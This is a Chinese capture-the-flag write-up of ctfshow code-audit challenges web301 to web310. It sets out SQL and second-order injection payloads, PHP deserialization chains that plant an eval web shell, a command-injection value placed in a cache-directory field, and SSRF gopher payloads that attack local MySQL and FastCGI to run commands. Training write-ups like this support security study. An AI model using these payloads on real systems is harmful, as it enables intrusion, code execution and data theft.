[TOC]



## 【ctfshow】代码审计

### web301            

![image-20230522204435835](https://raw.githubusercontent.com/leekosss/photoBed/master/202305222044970.png)

审计一下，存在sql注入漏洞，我们使用union：

![image-20230522204514927](https://raw.githubusercontent.com/leekosss/photoBed/master/202305222045955.png)

让输入的密码与查询出来的密码相等即可



### web302

> 修改的地方： `if(!strcasecmp(sds_decode($userpwd),$row['sds_password'])){ `

```php
function sds_decode($str){
	return md5(md5($str.md5(base64_encode("sds")))."sds");
}
```

当 `$userpwd=1`时： `sds_decode($userpwd) = d9c77c4e454869d5d8da3b4be79694d3`

因此，我们只需要密码传参：1，然后用户名使用联合查询：

```sql
' union select 'd9c77c4e454869d5d8da3b4be79694d3'#
```

注意需要将**数字使用单引号包裹**起来

![image-20230522204953183](https://raw.githubusercontent.com/leekosss/photoBed/master/202305222049219.png)



### web303

![image-20230522205533087](https://raw.githubusercontent.com/leekosss/photoBed/master/202305222055137.png)

这一题用户名长度增加了限制，小于6位，

但是从sql表中找到一条数据：

```sql
INSERT INTO `sds_user` VALUES ('1', 'admin', '27151b7b1ad51a38ea66b1529cde5ee4');
```

`admin`经过 `sds_decode()`函数加密刚好为：`27151b7b1ad51a38ea66b1529cde5ee4`

因此可以直接登录进去 `admin   admin`

注入点：`dptadd.php`

![image-20230522210704592](https://raw.githubusercontent.com/leekosss/photoBed/master/202305222107664.png)

然后会在：`dpt.php`回显出来

<img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202305222107133.png" alt="image-20230522210736092" style="zoom: 67%;" />

典型的二次注入

我们这样注入：查询库名

![image-20230522211054524](https://raw.githubusercontent.com/leekosss/photoBed/master/202305222110558.png)

查表名：

```sql
',sds_address=(select group_concat(table_name) from information_schema.tables where table_schema=database())#1
```

![image-20230522211306461](https://raw.githubusercontent.com/leekosss/photoBed/master/202305222113501.png)

查列名：

```sql
',sds_address=(select group_concat(column_name) from information_schema.columns where table_name='sds_fl9g')#1
```

`flag`

查数据：

```sql
',sds_address=(select flag from sds_fl9g)#
```





### web304

> 增加了全局waf 
>
> ```php
> function sds_waf($str){ 
> 	return preg_match('/[0-9]|[a-z]|-/i', $str); 
> 	} 
> ```
>
> 

同上



### web305

这一题给插入的数据使用了waf，不能走sql注入了

```php
function sds_waf($str){
	if(preg_match('/\~|\`|\!|\@|\#|\$|\%|\^|\&|\*|\(|\)|\_|\+|\=|\{|\}|\[|\]|\;|\:|\'|\"|\,|\.|\?|\/|\\\|\<|\>/', $str)){
		return false;
	}else{
		return true;
	}
}
```

我们在 `class.php`中发现可利用的点

```php
class user{
	public $username;
	public $password;
	public function __construct($u,$p){
		$this->username=$u;
		$this->password=$p;
	}
	public function __destruct(){
		file_put_contents($this->username, $this->password);
	}
}
```

析构方法可以写入文件。

在`checklogin.php`发现反序列化

![image-20230522213454762](https://raw.githubusercontent.com/leekosss/photoBed/master/202305222134802.png)

因此我们构造：

```php
<?php

class user{
	public $username;
	public $password;

}

$a = new user();
$a->username="1.php";
$a->password='<?php eval($_POST[1]);?>';

echo serialize($a);

O:4:"user":2:{s:8:"username";s:5:"1.php";s:8:"password";s:24:"<?php eval($_POST[1]);?>";}
```

cookie传参(注意url编码)

然后就可以使用蚁剑连接了，

但是flag存在数据库中：

![image-20230522214852360](https://raw.githubusercontent.com/leekosss/photoBed/master/202305222148415.png)

![image-20230522214906249](https://raw.githubusercontent.com/leekosss/photoBed/master/202305222149289.png)



### web306

> 开始使用mvc结构



在class.php中发现：

```php
class log{
	public $title='log.txt';
	public $info='';
	public function loginfo($info){
		$this->info=$this->info.$info;
	}
	public function close(){
		file_put_contents($this->title, $this->info);
	}
}
```

我们可以利用 `file_put_contents()`写入一句话木马

但是我们需要想办法调用 `close()`方法

在dao.php中发现：

```php
class dao{
	private $config;
	private $conn;

	...
	public function __destruct(){
		$this->conn->close();
	}

	...
}
```

dao类的析构方法会调用 close方法，所以我们只需要将`$conn`改为log类对象即可

然后在index.php中发现反序列化：

```php
<?php
session_start();
require "conn.php";
require "dao.php";
$user = unserialize(base64_decode($_COOKIE['user']));
if(!$user){
    header("location:login.php");
}
?>
```



构造：

```php
<?php

class log{
	public $title='1.php';
	public $info='<?php eval($_POST[1]);?>';


}

class dao {
    private $conn;

    public function __construct() {
        $this->conn = new log();
    }
}
$d = new dao();
echo base64_encode(serialize(new dao()));


TzozOiJkYW8iOjE6e3M6OToiAGRhbwBjb25uIjtPOjM6ImxvZyI6Mjp7czo1OiJ0aXRsZSI7czo1OiIxLnBocCI7czo0OiJpbmZvIjtzOjI0OiI8P3BocCBldmFsKCRfUE9TVFsxXSk7Pz4iO319
```

传参：

![image-20230522234331310](https://raw.githubusercontent.com/leekosss/photoBed/master/202305222343404.png)



蚁剑连接拿flag



### web307

这一题不会调用那个方法了，我们放弃



dao.php中出现可以命令执行的利用点：

```php
class dao{
	private $config;
	private $conn;

	public function __construct(){
		$this->config=new config();
		$this->init();
	}
	public function  clearCache(){
		shell_exec('rm -rf ./'.$this->config->cache_dir.'/*');
	}

}
```

config.php

```php
class config{
	public $cache_dir = 'cache';
}
```

在logout.php中可以利用：

```php
<?php

$service = unserialize(base64_decode($_COOKIE['service']));
if($service){
	$service->clearCache();
}

?>
```

 构造：

```php
<?php
class config{
	public $cache_dir = ';echo  "<?php eval(\$_POST[1]);?>" >a.php;';//linux的shell里面$有特殊意义所以转义一下。

}
class dao{
	private $config;
	public function __construct(){
		$this->config=new config();
	}

}
$a=new dao();
echo base64_encode(serialize($a));
?>

```





### web308

> 需要拿shell

![image-20230523095520572](https://raw.githubusercontent.com/leekosss/photoBed/master/202305230955633.png)

这一题`clearCache()`过滤了很多，我们放弃





我们在`fun.php`中发现：

```php
function checkUpdate($url){
		$ch=curl_init();
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_HEADER, false);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
		$res = curl_exec($ch);
		curl_close($ch);
		return $res;
	}
```

`curl`存在`ssrf漏洞`

然后该函数被：`dao.php`  `checkVersion()`函数调用：

```php
public function checkVersion(){
		return checkUpdate($this->config->update_url);
	}
```

然后 该函数又在`index.php`中被调用：

![image-20230523100129016](https://raw.githubusercontent.com/leekosss/photoBed/master/202305231001073.png)



就形成了一条pop链

然后我们看到 `config.php`中：

![image-20230523100547456](https://raw.githubusercontent.com/leekosss/photoBed/master/202305231005502.png)

使用mysql数据库，用户名：root，又**没有密码**，

所以我们可以使用**ssrf利用gopher协议打mysql去写入木马**。我们使用 `Gopherus`：

![image-20230523101234818](https://raw.githubusercontent.com/leekosss/photoBed/master/202305231012902.png)



然后构造脚本：

```php
<?php

class dao
{
    private $config;
    public function __construct() {
        $this->config = new config();
    }
}
class config
{
    public $update_url = 'gopher://127.0.0.1:3306/_%a3%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%46%00%00%00%03%73%65%6c%65%63%74%20%27%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%50%4f%53%54%5b%31%5d%29%3b%3f%3e%27%20%69%6e%74%6f%20%6f%75%74%66%69%6c%65%20%27%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%2f%61%2e%70%68%70%27%3b%01%00%00%00%01';
}


$d = new dao();
echo base64_encode(serialize($d));

```

cookie传参：

![image-20230523101313170](https://raw.githubusercontent.com/leekosss/photoBed/master/202305231013214.png)



命令执行即可：

![image-20230523101344498](https://raw.githubusercontent.com/leekosss/photoBed/master/202305231013545.png)





### web309

> 需要拿shell，308的方法不行了,mysql 有密码了
>

由于mysql有密码了，

**SSRF利用gopher协议打mysql数据库是只能在无密码的情况下进行**的，所以上题的方法失效了



不能打`mysql`，那我们只能测试一下`redis`和`fastcgi`，由于我们使用的是`mysql`

所以只需测试`fastcgi`即可



> 一般来说 FastCGI 都是绑定在 127.0.0.1 端口上的，但是利用 Gopher+SSRF 可以完美攻击 FastCGI 执行任意命令
>

```
FastCGI攻击需要满足三个条件：
1. PHP版本要高于5.3.3，才能动态修改PHP.INI配置文件
2. 知道题目环境中的一个PHP文件的绝对路径
3.PHP-FPM监听在本机9000端口
```
使用`gopherus`脚本利用`fastcgi`，我们需要知道服务器上存在的一个文件(最好是php)



> **在安装完php后会存在一个自带php文件**： `/usr/local/lib/php/PEAR.php` 
>
> `/usr/local/lib/php/PEAR.php` 是一个文件路径，指向位于 Unix-like 系统中的 PHP PEAR（PHP Extension and Application Repository）库的文件。
>
> PEAR 是一个第三方的 PHP 库和软件包管理系统，用于在 PHP 中方便地安装、升级和管理可重用的代码库。`PEAR.php` 文件是 PEAR 库的核心文件之一，它提供了用于加载和使用 PEAR 功能的函数和类。
>
> 通过包含 `PEAR.php` 文件，开发人员可以使用 PEAR 提供的功能和组件，例如自动加载类、安装和管理软件包、错误处理和日志记录等。它是 PEAR 库的入口点之一，其他的核心文件和组件也会在需要时被加载。
>
> 需要注意的是，`/usr/local/lib/php/PEAR.php` 是一个默认的路径示例，实际安装 PEAR 库的路径可能会有所不同，具体取决于系统和安装设置。



![image-20230523125606024](https://raw.githubusercontent.com/leekosss/photoBed/master/202305231256133.png)

使用**sleep命令**测试一下存在延迟，

经过测试，存在延迟，所以我们可以利用fastcgi去执行命令

![image-20230523125919040](https://raw.githubusercontent.com/leekosss/photoBed/master/202305231259098.png)



```php
<?php

class dao
{
    private $config;
    public function __construct() {
        $this->config = new config();
    }
}
class config
{
    public $update_url = 'gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%00%F6%06%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%02CONTENT_LENGTH58%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%09SCRIPT_FILENAMEindex.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%3A%04%00%3C%3Fphp%20system%28%27tac%20f%2A%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00';
}


$d = new dao();
echo base64_encode(serialize($d));


```

然后传参





### web310

经过测试，fastcgi的端口9000还是开放的，可以延迟，但是我们却读取不出flag了

我们先查找一下flag的路径：

![image-20230523132016898](https://raw.githubusercontent.com/leekosss/photoBed/master/202305231320954.png)



发现flag在 `/var/flag` 下：

![image-20230523132044162](https://raw.githubusercontent.com/leekosss/photoBed/master/202305231320211.png)

但是我们去读取还是读不出来



> `nginx.conf` 和 FastCGI 在 Nginx 中有密切的关系。下面是它们之间的关系解释：
>
> 1. **Nginx 配置文件 (`nginx.conf`)：** `nginx.conf` 是 Nginx 的主配置文件，用于定义服务器的行为和功能。在 `nginx.conf` 文件中，可以配置 Nginx 服务器的全局设置、虚拟主机配置、代理规则、缓存设置等。这个文件是 Nginx 的核心配置文件，决定了服务器的整体行为。
>
> 2. **FastCGI：** FastCGI 是一种用于处理动态内容的通信协议。它允许 Web 服务器（如 Nginx）与后端应用程序（如 PHP、Python、Ruby 等）进行通信。FastCGI 帮助提高服务器性能，通过长连接、进程管理和请求复用等机制，减少了每个请求启动新进程的开销。
>
> 3. **Nginx 与 FastCGI：** Nginx 作为一个高性能的 Web 服务器，常用于代理和反向代理后端的 FastCGI 应用程序。当 Nginx 接收到来自客户端的请求时，它可以通过配置将请求转发给 FastCGI 后端，由 FastCGI 进程处理动态内容的生成。通过 Nginx 和 FastCGI 的结合，可以有效地处理动态请求，并将静态和动态内容进行分离，提高服务器的性能和可扩展性。
>
> 在 `nginx.conf` 文件中，你可以使用 `location` 块来配置 Nginx 如何处理 FastCGI 请求。例如，你可以指定 FastCGI 后端的地址和端口、请求超时时间、缓存策略等。通过这些配置，Nginx 将能够将动态请求转发给 FastCGI 后端，并将响应返回给客户端。
>
> 总结来说，`nginx.conf` 是 Nginx 的主配置文件，定义了服务器的行为和功能，而 FastCGI 是一种通信协议，用于处理动态内容。Nginx 可以通过配置文件与 FastCGI 后端进行通信，实现动态内容的处理和分发。



这里我们可以先读取一下 nginx 服务器配置文件：`nginx.conf`

我们先查找一下路径：

![image-20230523132415592](https://raw.githubusercontent.com/leekosss/photoBed/master/202305231324652.png)

发现在：`/etc/nginx/nginx.conf` 路径下

于是我们读取它：

![image-20230523132451284](https://raw.githubusercontent.com/leekosss/photoBed/master/202305231324342.png)



nginx.conf

```nginx
...

http {
    include       /etc/nginx/mime.types;
    default_type  application/octet-stream;
    sendfile        on;
    keepalive_timeout  65;

    ...
        
    server {
        listen       4476;
        server_name  localhost;
        root         /var/flag;
        index index.html;

        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
}
```

在nginx配置文件中，我们发现，配置了端口为 4476 的http服务，并且该服务的根目录为：`/var/flag`

因此，我们可以直接构造一个http请求，去请求本机的4476端口：

```php
<?php

class dao
{
    private $config;
    public function __construct() {
        $this->config = new config();
    }
}
class config
{
    public $update_url = 'http://127.0.0.1:4476';
}


$d = new dao();
echo base64_encode(serialize($d));


```

传参得flag

